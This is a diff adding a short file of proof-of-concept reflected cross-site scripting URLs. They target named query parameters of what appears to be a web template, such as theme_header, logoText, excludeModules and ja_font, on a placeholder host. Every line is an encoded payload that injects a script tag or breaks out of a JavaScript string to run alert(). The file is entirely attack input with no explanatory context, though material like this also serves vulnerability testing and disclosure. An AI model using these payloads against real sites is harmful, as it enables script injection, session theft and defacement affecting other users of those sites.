@@ -1,0 +1,8 @@
+http://www.example.com/path/?theme_header=%22%3E%3Cscript%3Ealert(%2FXSS%2F)%3B%3C%2Fscript%3E
+http://www.example.com/path/?theme_background=%22%3E%3Cscript%3Ealert(%2FXSS%2F)%3B%3C%2Fscript%3E
+http://www.example.com/path/?theme_elements=%22%3E%3Cscript%3Ealert(%2FXSS%2F)%3B%3C%2Fscript%3E
+http://www.example.com/path/?logoType=1&logoText=%3Cscript%3Ealert(%2FXSS%2F)%3B%3C%2Fscript%3E
+http://www.example.com/path/?logoType=1&sloganText=%3Cscript%3Ealert(%2FXSS%2F)%3B%3C%2Fscript%3E
+http://www.example.com/path/?excludeModules=%27;alert(8);%20var%20b=%27
+http://www.example.com/path/?rightCollapseDefault=%27;alert(8);%20var%20b=%27
+http://www.example.com/path/?ja_font=%22%3E%3Cscript%3Ealert(%2FXSS%2F)%3B%3C%2Fscript%3E
